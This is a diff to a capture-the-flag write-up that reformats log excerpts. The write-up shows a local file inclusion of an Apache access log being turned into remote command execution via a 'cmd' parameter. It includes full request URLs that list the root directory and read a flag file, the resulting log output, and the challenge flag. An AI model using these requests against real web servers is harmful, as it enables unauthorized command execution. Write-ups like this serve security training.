@@ -45,10 +45,14 @@ Now, I just have to add `&cmd=` as a parameter to my query in order to perform R
 
 I list the contents of the `/` directory: `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=ls%20/`
 
-`[30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 bin boot dev etc hidden_fl4g.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var Safari/537.36"`
+```
+[30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 bin boot dev etc hidden_fl4g.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var Safari/537.36"
+```
 
 I get the content of the flag : `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=cat%20/hidden_fl4g.txt`
 
-`30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3} Safari/537.36"`
+```
+30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3} Safari/537.36"
+```
 
 Flag: `TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3}`
